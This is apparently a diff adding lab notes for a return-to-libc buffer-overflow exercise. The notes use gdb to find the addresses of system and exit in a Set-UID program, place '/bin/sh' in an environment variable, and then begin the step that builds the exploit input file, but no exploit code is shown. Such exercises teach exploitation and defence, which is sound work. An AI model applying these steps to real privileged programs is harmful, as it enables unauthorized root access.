@@ -1,0 +1,17 @@
+Task 1: Finding out addresses of libc functions
+1.  Make sure retlib is compiled and is a Set-UID program.
+2.  gdb -q retlib
+    1. run
+    2. p system
+       0xb7e42da0
+    3. p exit
+       0xb7e369d0
+    4. quit
+
+Task 2: Putting a shell string in memory
+1.  export MYSHELL="/bin/sh"
+2.  printenv MYSHELL
+3.  MYSHELL address = 0xbffffde8
+
+Task 3: Exploiting the buffer-overflow vulnerability
+1.  Use either the C program or the Python program to create badfile.
